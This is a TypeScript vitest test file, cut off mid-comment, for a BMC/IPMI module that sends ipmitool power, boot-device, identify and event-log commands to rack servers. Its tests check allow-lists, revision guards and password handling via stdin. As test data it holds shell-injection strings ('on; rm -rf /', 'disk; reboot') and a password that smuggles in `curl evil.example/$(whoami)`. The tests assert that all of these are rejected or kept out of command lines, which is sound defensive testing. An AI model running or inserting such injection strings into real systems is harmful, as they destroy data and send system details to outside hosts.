import { describe, expect, it } from 'vitest'
import type { ModuleExecResult } from '@shared/modules'
import type { OkResult } from '@shared/types'
import { moduleHarness, sharedModuleConfig, type ModuleHarness } from '../helpers/module-harness'
import { Actions } from '../../bmc/main/actions'
import { failureMessage } from '../../bmc/main/ipmi'
import { Queries } from '../../bmc/main/queries'
import {
  ConfigStore,
  Credentials,
  DEFAULT_SETTINGS,
  type BmcSettings
} from '../../bmc/main/store'
import { Incidents, SeriesLog, Sweeper } from '../../bmc/main/sweep'

/**
 * The methods that change a machine rather than read one.
 *
 * Everything else in this module observes hardware; this file cuts power to it,
 * re-points its next boot, blinks its front panel and erases its event log.
 * Three properties therefore matter more here than anywhere else.
 *
 * Each method names its subcommand from a fixed list, so a typo in a spec or a
 * hostile value in a form cannot become an arbitrary ipmitool invocation
 * against somebody's rack - which is only true if a rejected value issues no
 * command *at all*, not merely a harmless one. A caller holding a revision the
 * settings document has moved past is refused, because the entry it means may
 * now point at a different endpoint entirely, and "reset" against the wrong
 * chassis is not recoverable. And since 0.6.0 the password is fetched from the
 * app's encrypted secret store for each invocation, so a credential that is
 * missing or undecryptable has to be reported as *itself* - "enter it again" is
 * something a user can act on, where "the BMC refused the saved credentials"
 * sends them to the controller for a problem that is in the app.
 *
 * Driven by constructing Actions with its real collaborators, wired as
 * `createRuntime` wires them (bmc/main/runtime/container.ts). Going through
 * `harness.handlers` would add nothing - the handlers forward these arguments
 * verbatim - and would cost the two assertions this file leans on hardest:
 * the sweeper state a stale call drops, and the Queries caches a `sel clear`
 * must and must not invalidate.
 */

const PASSWORD = 'r4ck-adm1n-never-in-argv'

/** The invocation prefix `runIpmi` builds for m1 (see bmc/main/ipmi/client.ts). */
const M1_PREFIX = `IPMI_PASSWORD="$(cat)" ipmitool -I lanplus -H '10.0.0.5' -p '623' -U 'operator' -E -N 3 -R 2`

const M1_HOST = "-H '10.0.0.5'"
const M2_HOST = "-H '10.0.0.6'"

/** The full command line a method that acts on m1 must produce. */
function m1Command(subcommand: string): string {
  return `${M1_PREFIX} ${subcommand}`
}

const POWER_STATUS_ON = 'Chassis Power is on\n'

const SDR_STDOUT = `Fan1 RPM         | 30h | ok  |  7.1 | 3720 RPM
Inlet Temp       | 04h | ok  |  7.1 | 23 degrees C
`

const SEL_STDOUT = `   1 | 04/12/2026 | 09:12:44 | Temperature CPU1 Temp | Upper Critical going high | Asserted
`

/** The BMC refused the saved account: it plainly answered, so this is not a network fault. */
const AUTH_REFUSED: ModuleExecResult = {
  stdout: '',
  stderr: 'Error: RAKP 2 HMAC is invalid\nError: Unable to establish IPMI v2 / RMCP+ session\n',
  code: 1
}

/** ipmitool's own words above, as `resultMessage` collapses them for a notice. */
const AUTH_REFUSED_SAID =
  'Error: RAKP 2 HMAC is invalid Error: Unable to establish IPMI v2 / RMCP+ session'

type Kind = 'status' | 'power' | 'bootdev' | 'identify' | 'selClear' | 'sdr' | 'sel'

function ok(stdout: string): ModuleExecResult {
  return { stdout, stderr: '', code: 0 }
}

/** Let every already-queued microtask run, for the tests that watch work in flight. */
async function flush(ticks = 50): Promise<void> {
  for (let index = 0; index < ticks; index++) await Promise.resolve()
}

/**
 * Route on the command string - all a management machine ever sees is one
 * shell line per action. `chassis power status` is matched before the power
 * verbs on purpose: it is a read the sweep issues, not one of the five.
 */
function kindOf(command: string): Kind {
  if (command.includes('chassis power status')) return 'status'
  if (command.includes('chassis power ')) return 'power'
  if (command.includes('chassis bootdev ')) return 'bootdev'
  if (command.includes('chassis identify ')) return 'identify'
  if (command.includes('sel clear')) return 'selClear'
  if (command.includes('sdr elist')) return 'sdr'
  if (command.includes('sel elist')) return 'sel'
  throw new Error(`no fixture for command: ${command}`)
}

/**
 * A version 3 settings document: machines, and no passwords anywhere in it.
 * Addresses run from 10.0.0.5 upwards, so `m1` is 10.0.0.5 and `m2` 10.0.0.6.
 */
function bmcDocument(settings: Partial<BmcSettings> = {}, count = 2): unknown {
  return {
    version: 3,
    hintsOn: true,
    settings: { ...DEFAULT_SETTINGS, ...settings },
    machines: Array.from({ length: count }, (_, index) => ({
      id: `m${index + 1}`,
      revision: `r${index + 1}`,
      name: `rack-a-${String(index + 1).padStart(2, '0')}`,
      ip: `10.0.0.${5 + index}`,
      port: 623,
      username: 'operator',
      enabled: true
    }))
  }
}

interface RigOptions {
  /** What the secret store holds for each machine; null keeps nothing at all. */
  password?: string | null
  /** Machine ids whose stored credential this install can no longer decrypt. */
  unreadable?: readonly string[]
  /** Machine ids with no credential in the store, standing in for one never entered. */
  withoutPassword?: readonly string[]
  machineCount?: number
  answer?: (command: string) => ModuleExecResult | Promise<ModuleExecResult>
}

interface Rig {
  harness: ModuleHarness
  actions: Actions
  queries: Queries
  sweeper: Sweeper
  /** Reassign a member to make that command fail from the next call onwards. */
  replies: Record<Kind, ModuleExecResult>
  /** Every command `exec` was given, in order. */
  commands(): string[]
  /** Every command containing all of `fragments`. */
  calls(...fragments: string[]): string[]
  /** The settings document as it stands, for assertions about what was written. */
  document(): unknown
}

/**
 * Actions with its real collaborators. The sweeper's readiness gate answers
 * "yes" so a post-action refresh behaves as it does on a connected machine, and
 * the passwords live where they live in 0.6.0 - the secret store, keyed
 * `machine/<id>`, never the settings document.
 */
function rig(settings: Partial<BmcSettings> = {}, options: RigOptions = {}): Rig {
  const replies: Record<Kind, ModuleExecResult> = {
    status: ok(POWER_STATUS_ON),
    power: ok(''),
    bootdev: ok('Set Boot Device to disk\n'),
    identify: ok('Chassis identify interval: 15 seconds\n'),
    selClear: ok('Clearing SEL. Please allow a few seconds to erase.\n'),
    sdr: ok(SDR_STDOUT),
    sel: ok(SEL_STDOUT)
  }
  const count = options.machineCount ?? 2
  const password = options.password === undefined ? PASSWORD : options.password
  const withoutPassword = new Set(options.withoutPassword ?? [])
  const secrets: Record<string, string> = {}
  if (password !== null) {
    for (let index = 0; index < count; index++) {
      const id = `m${index + 1}`
      if (!withoutPassword.has(id)) secrets[`machine/${id}`] = password
    }
  }
  const harness = moduleHarness(
    'bmc',
    options.answer ?? ((command: string) => replies[kindOf(command)]),
    {
      config: sharedModuleConfig(bmcDocument(settings, count)),
      secrets,
      unreadableSecrets: (options.unreadable ?? []).map((id) => `machine/${id}`)
    }
  )
  const store = new ConfigStore(harness.ctx)
  const credentials = new Credentials(harness.ctx)
  const sweeper = new Sweeper(
    harness.ctx,
    store,
    async () => true,
    new SeriesLog(harness.ctx),
    credentials,
    new Incidents(harness.ctx)
  )
  const queries = new Queries(harness.ctx, store, credentials)
  const commands = (): string[] => harness.exec.mock.calls.map((call) => call[0])

  return {
    harness,
    actions: new Actions(harness.ctx, store, sweeper, queries, credentials),
    queries,
    sweeper,
    replies,
    commands,
    calls: (...fragments: string[]) =>
      commands().filter((command) => fragments.every((fragment) => command.includes(fragment))),
    document: () => harness.ctx.configGet()
  }
}

/* ------------------------------------------------------------------------ */
/* powerAction                                                               */
/* ------------------------------------------------------------------------ */

const POWER_VERBS: ReadonlyArray<{ action: string; subcommand: string }> = [
  { action: 'on', subcommand: 'chassis power on' },
  { action: 'soft', subcommand: 'chassis power soft' },
  { action: 'off', subcommand: 'chassis power off' },
  { action: 'cycle', subcommand: 'chassis power cycle' },
  { action: 'reset', subcommand: 'chassis power reset' }
]

describe('powerAction: each button sends its own subcommand and no other', () => {
  for (const { action, subcommand } of POWER_VERBS) {
    it(`sends exactly "${subcommand}" for the ${action} button, and none of the other four verbs`, async () => {
      // The five differ by a single word and by whether the operating system
      // gets to shut down. Asserting only that exec ran would let "soft" and
      // "off" swap places without a test noticing.
      const r = rig()

      const result = await r.actions.powerAction('m1', 'r1', action)

      expect(result).toEqual({ ok: true })
      expect(r.commands()[0]).toBe(m1Command(subcommand))
      for (const other of POWER_VERBS.filter((verb) => verb.action !== action)) {
        expect(r.commands().some((command) => command.endsWith(other.subcommand))).toBe(false)
      }
    })
  }

  it('sends the chosen verb to the chosen machine only, with the other machine untouched', async () => {
    const r = rig()

    await r.actions.powerAction('m2', 'r2', 'cycle')

    expect(r.commands()[0]).toBe(
      `IPMI_PASSWORD="$(cat)" ipmitool -I lanplus -H '10.0.0.6' -p '623' -U 'operator' -E -N 3 -R 2 chassis power cycle`
    )
    expect(r.calls(M1_HOST)).toHaveLength(0)
  })
})

describe('powerAction: the allow-list, which is the only thing between a spec typo and a rack', () => {
  const REJECTED: ReadonlyArray<{ label: string; value: unknown }> = [
    { label: 'a verb that does not exist', value: 'destroy' },
    { label: 'an empty string', value: '' },
    { label: 'a shell injection dressed as a verb', value: 'on; rm -rf /' },
    { label: 'a verb with a trailing space', value: 'on ' },
    { label: 'the right verb in the wrong case', value: 'ON' },
    { label: 'a read pretending to be an action', value: 'status' },
    { label: 'nothing at all', value: null },
    { label: 'an argument the renderer never sent', value: undefined },
    { label: 'a value that is not a string', value: 42 }
  ]

  for (const { label, value } of REJECTED) {
    it(`refuses ${label} and issues no ipmitool run whatsoever`, async () => {
      // Not "issues a harmless command" - issues none. A rejected value that
      // still reached a shell would already have lost the argument.
      const r = rig()

      const result = await r.actions.powerAction('m1', 'r1', value)

      expect(result).toEqual({ ok: false, error: 'unsupported power action' })
      expect(r.calls('ipmitool')).toHaveLength(0)
    })
  }

  it('reaches the connected machine shell not at all for a rejected verb, not merely ipmitool', async () => {
    // The assertions above filter for `ipmitool`. This one is unfiltered: no
    // exec of any shape happened, so there is no command for a rejected value
    // to have been quoted into in the first place.
    const r = rig()

    await r.actions.powerAction('m1', 'r1', 'on; rm -rf /')

    expect(r.commands()).toEqual([])
    expect(r.harness.exec).not.toHaveBeenCalled()
  })
})

describe('powerAction: what happens after the command lands', () => {
  it('re-reads the power state of that one machine, so the card stops showing the state it just changed', async () => {
    const r = rig()

    await r.actions.powerAction('m1', 'r1', 'off')

    // One further `chassis power status` for m1, and nothing for m2 - a refresh
    // is not a sweep.
    expect(r.calls('chassis power status', M1_HOST)).toHaveLength(1)
    expect(r.calls(M2_HOST)).toHaveLength(0)
    expect(r.sweeper.stateFor('m1', 'r1')?.power).toBe('on')
  })

  it('does not refresh anything when the power command failed, so no reading is taken on a false premise', async () => {
    const r = rig()
    r.replies.power = AUTH_REFUSED

    const result = await r.actions.powerAction('m1', 'r1', 'reset')

    expect(result.ok).toBe(false)
    expect(r.calls('chassis power status')).toHaveLength(0)
    expect(r.sweeper.stateFor('m1', 'r1')).toBeUndefined()
  })

  it('answers a failed power action with one sentence carrying both the explanation and ipmitool own words', async () => {
    // Two audiences in one line: the person in front of the rack needs to be
    // told to check the account, and whoever is debugging ipmitool needs its
    // actual output rather than a paraphrase of it.
    const r = rig()
    r.replies.power = AUTH_REFUSED

    const result = await r.actions.powerAction('m1', 'r1', 'on')

    expect(result.ok).toBe(false)
    expect(result.error).toBe(`${failureMessage('auth')} (ipmitool said: ${AUTH_REFUSED_SAID})`)
    expect(result.error).toContain('refused the saved credentials')
    expect(result.error).toContain('RAKP 2 HMAC is invalid')
    // A card notice, not a log pane.
    expect(result.error).not.toContain('\n')
  })
})

/* ------------------------------------------------------------------------ */
/* powerBulk                                                                 */
/* ------------------------------------------------------------------------ */

describe('powerBulk: one power action against every ticked machine', () => {
  for (const { action, subcommand } of POWER_VERBS) {
    it(`sends "${subcommand}" once to each ticked machine for the ${action} button`, async () => {
      const r = rig()

      const result = await r.actions.powerBulk(['m1', 'm2'], action)

      expect(result).toEqual({ ok: true, data: `${action} sent to 2 of 2 machines` })
      expect(r.calls(subcommand)).toEqual([
        m1Command(subcommand),
        `IPMI_PASSWORD="$(cat)" ipmitool -I lanplus -H '10.0.0.6' -p '623' -U 'operator' -E -N 3 -R 2 ${subcommand}`
      ])
      for (const other of POWER_VERBS.filter((verb) => verb.action !== action)) {
        expect(r.commands().some((command) => command.endsWith(other.subcommand))).toBe(false)
      }
    })
  }

  it('acts on the ticked machines only, leaving an unticked one alone', async () => {
    const r = rig({}, { machineCount: 3 })

    const result = await r.actions.powerBulk(['m1', 'm3'], 'off')

    expect(result).toEqual({ ok: true, data: 'off sent to 2 of 2 machines' })
    expect(r.calls('chassis power off', M1_HOST)).toHaveLength(1)
    expect(r.calls('chassis power off', "-H '10.0.0.7'")).toHaveLength(1)
    expect(r.calls('chassis power off', M2_HOST)).toHaveLength(0)
  })

  it('skips an id the document no longer has, counts it, and still acts on the rest', async () => {
    // A selection has no revision to check, so a row deleted while the boxes
    // were ticked is reported rather than allowed to fail the whole batch:
    // acting on nineteen of twenty and saying which one was missed beats
    // refusing all twenty.
    const r = rig()

    const result = await r.actions.powerBulk(['m1', 'deleted-elsewhere', 'm2'], 'cycle')

    expect(result.ok).toBe(true)
    expect(result.data).toContain('cycle sent to 2 of 3 machines')
    expect(result.data).toContain('1 were no longer in the list')
    expect(r.calls('chassis power cycle')).toHaveLength(2)
  })

  const REJECTED_BULK: ReadonlyArray<{ label: string; value: unknown }> = [
    { label: 'a verb that does not exist', value: 'destroy' },
    { label: 'a shell injection dressed as a verb', value: 'off; rm -rf /' },
    { label: 'the right verb in the wrong case', value: 'OFF' },
    { label: 'a read pretending to be an action', value: 'status' },
    { label: 'an empty string', value: '' },
    { label: 'nothing at all', value: null },
    { label: 'a value that is not a string', value: 42 }
  ]

  for (const { label, value } of REJECTED_BULK) {
    it(`refuses ${label} and issues no exec whatsoever, however many machines were ticked`, async () => {
      // The allow-list matters more here than anywhere: one bad value would
      // reach every machine in the rack rather than one.
      const r = rig()

      const result = await r.actions.powerBulk(['m1', 'm2'], value)

      expect(result).toEqual({ ok: false, error: 'unsupported power action' })
      expect(r.commands()).toEqual([])
      expect(r.harness.exec).not.toHaveBeenCalled()
    })
  }

  const EMPTY_SELECTIONS: ReadonlyArray<{ label: string; value: unknown }> = [
    { label: 'an empty array', value: [] },
    { label: 'nothing at all', value: null },
    { label: 'an argument the renderer never sent', value: undefined },
    // Not treated as one machine: a bare string would be spread into
    // characters by anything less careful, and "m1" is not a selection.
    { label: 'a single id sent as a bare string', value: 'm1' },
    { label: 'an object that is not a list', value: { ids: ['m1'] } }
  ]

  for (const { label, value } of EMPTY_SELECTIONS) {
    it(`refuses ${label} rather than acting on the whole fleet`, async () => {
      const r = rig()

      const result = await r.actions.powerBulk(value, 'off')

      expect(result).toEqual({ ok: false, error: 'no machines were selected' })
      expect(r.harness.exec).not.toHaveBeenCalled()
    })
  }

  it('never has more ipmitool runs in flight at once than sweepConcurrency allows', async () => {
    // This is the one place a user can ask for sixty-four simultaneous
    // ipmitool processes on the connected machine, so the bulk action is
    // bounded by the same rule a sweep obeys.
    let inFlight = 0
    let peak = 0
    const release: Array<() => void> = []
    const r = rig(
      { sweepConcurrency: 3 },
      {
        machineCount: 8,
        answer: (command) => {
          if (command.includes('chassis power status')) return ok(POWER_STATUS_ON)
          if (command.includes('chassis power ')) {
            inFlight += 1
            peak = Math.max(peak, inFlight)
            return new Promise<ModuleExecResult>((resolve) => {
              release.push(() => {
                inFlight -= 1
                resolve(ok(''))
              })
            })
          }
          return ok(SDR_STDOUT)
        }
      }
    )
    const ids = Array.from({ length: 8 }, (_, index) => `m${index + 1}`)

    const pending = r.actions.powerBulk(ids, 'off')
    await flush()

    expect(inFlight).toBe(3)
    expect(peak).toBe(3)

    while (release.length > 0) {
      for (const go of release.splice(0)) go()
      await flush()
    }
    const result = await pending

    expect(result).toEqual({ ok: true, data: 'off sent to 8 of 8 machines' })
    expect(r.calls('chassis power off')).toHaveLength(8)
    // Held at the limit for the whole batch, not merely at the start of it.
    expect(peak).toBe(3)
  })

  it('names the machines it could not reach while still reporting the ones it did', async () => {
    // Half a rack answering is a result, not a failure - but the half that did
    // not has to be named, or somebody walks away believing all of it moved.
    const r = rig({}, { withoutPassword: ['m2'] })

    const result = await r.actions.powerBulk(['m1', 'm2'], 'on')

    expect(result.ok).toBe(true)
    expect(result.data).toContain('on sent to 1 of 2 machines')
    expect(result.data).toContain('rack-a-02')
    expect(result.data).toContain('No password is saved')
    // The machine with no usable credential was never asked anything.
    expect(r.calls('chassis power on')).toEqual([m1Command('chassis power on')])
  })

  it('refuses the batch outright when nothing at all could be reached', async () => {
    const r = rig()
    r.replies.power = AUTH_REFUSED

    const result = await r.actions.powerBulk(['m1', 'm2'], 'reset')

    expect(result.ok).toBe(false)
    expect(result.error).toContain('rack-a-01')
    expect(result.error).toContain('rack-a-02')
    expect(result.error).toContain('RAKP 2 HMAC is invalid')
  })

  it('re-reads the fleet afterwards, so no card keeps the state the batch just changed', async () => {
    const r = rig()

    await r.actions.powerBulk(['m1', 'm2'], 'off')
    // A bulk action refreshes everything rather than one machine, so this
    // joins the sweep it started instead of asking for a second one.
    await r.sweeper.run()

    expect(r.calls('chassis power status', M1_HOST).length).toBeGreaterThan(0)
    expect(r.calls('chassis power status', M2_HOST).length).toBeGreaterThan(0)
    expect(r.sweeper.stateFor('m1', 'r1')?.power).toBe('on')
    expect(r.sweeper.stateFor('m2', 'r2')?.power).toBe('on')
  })
})

/* ------------------------------------------------------------------------ */
/* bootDevSet                                                                */
/* ------------------------------------------------------------------------ */

describe('bootDevSet: the device, and whether the override survives the next boot', () => {
  const DEVICES = ['none', 'pxe', 'disk', 'cdrom', 'bios'] as const

  for (const device of DEVICES) {
    it(`sends exactly "chassis bootdev ${device}" for the ${device} option`, async () => {
      const r = rig()

      const result = await r.actions.bootDevSet('m1', 'r1', device, false)

      expect(result).toEqual({ ok: true })
      expect(r.commands()).toEqual([m1Command(`chassis bootdev ${device}`)])
    })
  }

  it('appends options=persistent only when the checkbox really posted a boolean true', async () => {
    const r = rig()

    const result = await r.actions.bootDevSet('m1', 'r1', 'disk', true)

    expect(result).toEqual({ ok: true })
    expect(r.commands()).toEqual([m1Command('chassis bootdev disk options=persistent')])
  })

  const NOT_PERSISTENT: ReadonlyArray<{ label: string; value: unknown }> = [
    { label: 'an unticked checkbox', value: false },
    { label: 'a missing argument', value: undefined },
    { label: 'an explicit null', value: null },
    { label: 'the number zero', value: 0 },
    { label: 'an empty string', value: '' },
    // The rule is `persistentRaw === true`, not a truthiness test. A form that
    // ever posted its checkbox as text would silently get a one-shot override
    // instead of a permanent one - which is the safe direction to fail in, and
    // is pinned here so a change to it has to be deliberate.
    { label: 'the string "true", which is not a boolean', value: 'true' },
    { label: 'the number one', value: 1 },
    { label: 'the string "persistent"', value: 'persistent' }
  ]

  for (const { label, value } of NOT_PERSISTENT) {
    it(`leaves the override at the next boot only for ${label}`, async () => {
      const r = rig()

      await r.actions.bootDevSet('m1', 'r1', 'pxe', value)

      expect(r.commands()).toEqual([m1Command('chassis bootdev pxe')])
      expect(r.commands()[0]).not.toContain('options=persistent')
    })
  }

  const REJECTED_DEVICES: ReadonlyArray<{ label: string; value: unknown }> = [
    { label: 'a device this module does not support', value: 'usb' },
    { label: 'an empty selection', value: '' },
    { label: 'a shell injection dressed as a device', value: 'disk; reboot' },
    { label: 'the right device in the wrong case', value: 'DISK' },
    { label: 'a missing argument', value: undefined },
    { label: 'a value that is not a string', value: { device: 'disk' } }
  ]

  for (const { label, value } of REJECTED_DEVICES) {
    it(`refuses ${label} and issues no ipmitool run whatsoever`, async () => {
      const r = rig()

      const result = await r.actions.bootDevSet('m1', 'r1', value, true)

      expect(result).toEqual({ ok: false, error: 'unsupported boot device' })
      expect(r.calls('ipmitool')).toHaveLength(0)
    })
  }

  it('reports a failed override with the explanation and ipmitool own words, and refreshes nothing', async () => {
    // Setting a boot device changes no power state, so unlike a power action
    // there is nothing for a card to re-read.
    const r = rig()
    r.replies.bootdev = AUTH_REFUSED

    const result = await r.actions.bootDevSet('m1', 'r1', 'bios', true)

    expect(result.ok).toBe(false)
    expect(result.error).toBe(`${failureMessage('auth')} (ipmitool said: ${AUTH_REFUSED_SAID})`)
    expect(r.calls('chassis power status')).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------------ */
/* identify                                                                  */
/* ------------------------------------------------------------------------ */

describe('identify: how long the front-panel LED blinks for', () => {
  const OMITTED: ReadonlyArray<{ label: string; value: unknown }> = [
    { label: 'the prompt was dismissed without a number', value: null },
    { label: 'the prompt came back blank', value: '' },
    { label: 'the argument never arrived', value: undefined }
  ]

  for (const { label, value } of OMITTED) {
    it(`falls back to the configured identifySeconds when ${label}`, async () => {
      // The seed is deliberately not the shipped default of 15: a fallback that
      // ignored the settings document would still pass against 15.
      const r = rig({ identifySeconds: 45 })

      const result = await r.actions.identify('m1', 'r1', value)

      expect(result).toEqual({ ok: true })
      expect(r.commands()).toEqual([m1Command('chassis identify 45')])
    })
  }

  it('treats zero as a real duration rather than a missing one, because zero is how the blink is stopped', async () => {
    const r = rig({ identifySeconds: 45 })

    await r.actions.identify('m1', 'r1', 0)

    expect(r.commands()).toEqual([m1Command('chassis identify 0')])
  })

  const CLAMPED: ReadonlyArray<{ label: string; value: unknown; seconds: number }> = [
    { label: 'a negative number is raised to the floor of the band', value: -5, seconds: 0 },
    { label: 'a number past the ceiling is capped at 255', value: 999, seconds: 255 },
    { label: 'a fraction is truncated rather than rounded', value: 12.7, seconds: 12 },
    { label: 'a number typed into a text field arrives as a string', value: '30', seconds: 30 },
    { label: 'the top of the band is passed through unchanged', value: 255, seconds: 255 }
  ]

  for (const { label, value, seconds } of CLAMPED) {
    it(`keeps the interval inside the 0..255 byte IPMI allows: ${label}`, async () => {
      const r = rig({ identifySeconds: 45 })

      const result = await r.actions.identify('m1', 'r1', value)

      expect(result).toEqual({ ok: true })
      expect(r.commands()).toEqual([m1Command(`chassis identify ${seconds}`)])
    })
  }

  it('falls back to the configured default, not the shipped one, for a value that is not a number at all', async () => {
    // A user who moved this off fifteen meant it, so every unreadable input
    // lands on their number rather than on the one the module ships with -
    // the same answer an empty prompt gets.
    const r = rig({ identifySeconds: 45 })

    await r.actions.identify('m1', 'r1', 'banana')

    expect(DEFAULT_SETTINGS.identifySeconds).toBe(15)
    expect(r.commands()).toEqual([m1Command('chassis identify 45')])
  })

  it('reports a failed identify with the explanation and ipmitool own words', async () => {
    const r = rig()
    r.replies.identify = AUTH_REFUSED

    const result = await r.actions.identify('m1', 'r1', 30)

    expect(result.ok).toBe(false)
    expect(result.error).toBe(`${failureMessage('auth')} (ipmitool said: ${AUTH_REFUSED_SAID})`)
  })
})

/* ------------------------------------------------------------------------ */
/* selClear                                                                  */
/* ------------------------------------------------------------------------ */

describe('selClear: erasing the event log, and the one cache that has to follow it', () => {
  it('sends exactly "sel clear" and nothing else', async () => {
    const r = rig()

    const result = await r.actions.selClear('m1', 'r1')

    expect(result).toEqual({ ok: true })
    expect(r.commands()).toEqual([m1Command('sel clear')])
  })

  it('drops the cached event log so the next read is a real one, and leaves the sensor cache alone', async () => {
    // The event log is the only thing that changed. Clearing the sensor cache
    // as well would buy a fresh `sdr elist` round trip per erase for nothing,
    // and not clearing the log would leave the drawer showing entries the BMC
    // no longer has.
    const r = rig()
    await r.queries.sensorRows('m1', 'r1')
    await r.queries.selRows('m1', 'r1')
    expect(r.calls('sdr elist', M1_HOST)).toHaveLength(1)
    expect(r.calls('sel elist', M1_HOST)).toHaveLength(1)

    await r.actions.selClear('m1', 'r1')
    await r.queries.selRows('m1', 'r1')
    await r.queries.sensorRows('m1', 'r1')

    expect(r.calls('sel elist', M1_HOST)).toHaveLength(2)
    expect(r.calls('sdr elist', M1_HOST)).toHaveLength(1)
  })

  it('leaves the other machine’s cached event log where it was, because only one BMC was erased', async () => {
    const r = rig()
    await r.queries.selRows('m1', 'r1')
    await r.queries.selRows('m2', 'r2')

    await r.actions.selClear('m1', 'r1')
    await r.queries.selRows('m2', 'r2')

    expect(r.calls('sel elist', M2_HOST)).toHaveLength(1)
  })

  it('keeps the cached log when the erase failed, because the entries are still on the BMC', async () => {
    const r = rig()
    await r.queries.selRows('m1', 'r1')
    r.replies.selClear = AUTH_REFUSED

    const result = await r.actions.selClear('m1', 'r1')
    await r.queries.selRows('m1', 'r1')

    expect(result.ok).toBe(false)
    expect(result.error).toBe(`${failureMessage('auth')} (ipmitool said: ${AUTH_REFUSED_SAID})`)
    expect(r.calls('sel elist', M1_HOST)).toHaveLength(1)
  })
})

/* ------------------------------------------------------------------------ */
/* The revision guard                                                        */
/* ------------------------------------------------------------------------ */

const STALE_MESSAGE = 'that BMC machine changed or was removed - reopen its card and try again'

interface ActionCase {
  name: string
  call: (r: Rig, id: string, revision: string) => Promise<OkResult>
}

const STALE_CASES: readonly ActionCase[] = [
  { name: 'powerAction', call: (r, id, revision) => r.actions.powerAction(id, revision, 'off') },
  { name: 'bootDevSet', call: (r, id, revision) => r.actions.bootDevSet(id, revision, 'pxe', true) },
  { name: 'identify', call: (r, id, revision) => r.actions.identify(id, revision, 30) },
  { name: 'selClear', call: (r, id, revision) => r.actions.selClear(id, revision) }
]

describe('the revision guard: an action held open while the entry moved underneath it', () => {
  for (const { name, call } of STALE_CASES) {
    it(`${name} refuses a revision the settings document has moved past, and sends nothing`, async () => {
      // A drawer left open across an edit still holds the old revision. The
      // entry it names may now point at a different address entirely, so the
      // command is not sent to "probably the same machine" - it is not sent.
      const r = rig()

      const result = await call(r, 'm1', 'r-edited-elsewhere')

      expect(result).toEqual({ ok: false, error: STALE_MESSAGE })
      expect(r.calls('ipmitool')).toHaveLength(0)
    })

    it(`${name} forgets that machine's swept state, so no card keeps a reading nobody can vouch for`, async () => {
      const r = rig()
      await r.sweeper.run()
      const before = r.calls('ipmitool').length
      expect(r.sweeper.stateFor('m1', 'r1')).toBeDefined()

      await call(r, 'm1', 'r-edited-elsewhere')

      expect(r.sweeper.stateFor('m1', 'r1')).toBeUndefined()
      expect(r.sweeper.stateFor('m1', 'r-edited-elsewhere')).toBeUndefined()
      // The neighbour was swept under a revision nobody disputed and keeps its
      // reading; the refusal above cost no further round trip either.
      expect(r.sweeper.stateFor('m2', 'r2')).toBeDefined()
      expect(r.calls('ipmitool')).toHaveLength(before)
    })

    it(`${name} refuses an id the document does not have, which is what a deleted entry looks like`, async () => {
      const r = rig()

      const result = await call(r, 'deleted-machine', 'r1')

      expect(result).toEqual({ ok: false, error: STALE_MESSAGE })
      expect(r.calls('ipmitool')).toHaveLength(0)
    })

    it(`${name} does the work when the revision is the current one, so the refusals above are about the revision`, async () => {
      const r = rig()

      const result = await call(r, 'm1', 'r1')

      expect(result).toEqual({ ok: true })
      expect(r.calls('ipmitool', M1_HOST).length).toBeGreaterThan(0)
    })
  }
})

/* ------------------------------------------------------------------------ */
/* The credential                                                            */
/* ------------------------------------------------------------------------ */

describe('a credential that is missing or unreadable is reported as itself', () => {
  for (const { name, call } of STALE_CASES) {
    it(`${name} says no password is saved, in those words, and asks the BMC nothing`, async () => {
      // The wrong answer here is "the BMC refused the saved credentials",
      // which is what running ipmitool with an empty password would produce.
      // It sends somebody to the controller for a problem that is in the app -
      // and, on hardware that locks an account after a few bad attempts, it
      // does real damage once per sweep until they get there.
      const r = rig({}, { password: null })

      const result = await call(r, 'm1', 'r1')

      expect(result.ok).toBe(false)
      expect(result.error).toContain('No password is saved')
      expect(result.error).toContain('Module settings page')
      expect(result.error).not.toContain('ipmitool')
      expect(r.harness.exec).not.toHaveBeenCalled()
    })

    it(`${name} says the saved password can no longer be read, and asks the BMC nothing`, async () => {
      // `data/secret.key` replaced - a fresh install, or a `data/` restored
      // without it. Every stored password became undecryptable at once, and
      // the only thing that helps is being told to enter this one again.
      const r = rig({}, { unreadable: ['m1'] })

      const result = await call(r, 'm1', 'r1')

      expect(result.ok).toBe(false)
      expect(result.error).toContain('cannot be read')
      expect(result.error).toContain('enter it again')
      expect(result.error).not.toContain('ipmitool')
      expect(r.harness.exec).not.toHaveBeenCalled()
    })

    it(`${name} still works for a machine whose credential is fine while a neighbour's is not`, async () => {
      // One broken credential does not take the rest of the fleet with it.
      const r = rig({}, { withoutPassword: ['m1'] })

      const result = await call(r, 'm2', 'r2')

      expect(result).toEqual({ ok: true })
      expect(r.calls('ipmitool', M2_HOST).length).toBeGreaterThan(0)
      expect(r.calls(M1_HOST)).toHaveLength(0)
    })
  }

  it('powerBulk reports each unusable credential as itself rather than as a failed action', async () => {
    const r = rig({}, { password: null })

    const result = await r.actions.powerBulk(['m1', 'm2'], 'off')

    expect(result.ok).toBe(false)
    expect(result.error).toContain('rack-a-01')
    expect(result.error).toContain('No password is saved')
    expect(r.harness.exec).not.toHaveBeenCalled()
  })
})

describe('the credential these commands carry', () => {
  it('never writes the password into any command line, however the action is spelled', async () => {
    // A command line is readable via `ps` by every user on the connected
    // machine, and lands in the app's own command log. The password goes down
    // stdin into `IPMI_PASSWORD="$(cat)"` for `ipmitool -E` instead - which is
    // asserted here across every command these methods build, including the
    // refresh a power action triggers.
    const r = rig({ identifySeconds: 45 })

    await r.actions.powerAction('m1', 'r1', 'cycle')
    await r.actions.bootDevSet('m1', 'r1', 'pxe', true)
    await r.actions.identify('m1', 'r1', null)
    await r.actions.selClear('m1', 'r1')
    await r.actions.powerAction('m2', 'r2', 'soft')

    expect(r.commands().length).toBeGreaterThan(5)
    for (const [command, options] of r.harness.exec.mock.calls) {
      expect(command).not.toContain(PASSWORD)
      expect(command).toContain('IPMI_PASSWORD="$(cat)"')
      expect(options?.stdin).toBe(PASSWORD)
    }
  })

  it('keeps a password made of shell metacharacters out of the command line too', async () => {
    const nasty = `'; curl evil.example/$(whoami) #`
    const r = rig({}, { password: nasty })

    await r.actions.powerAction('m1', 'r1', 'off')
    await r.actions.selClear('m1', 'r1')

    expect(r.commands().length).toBeGreaterThan(2)
    for (const [command, options] of r.harness.exec.mock.calls) {
      expect(command).not.toContain('curl')
      expect(command).not.toContain(nasty)
      expect(options?.stdin).toBe(nasty)
    }
  })

  it('takes the password from the secret store, and never writes it into the settings document', async () => {
    // The document is a plain JSON file on disk. Since 0.6.0 the only place a
    // BMC password is kept is the app's encrypted store, and an action reading
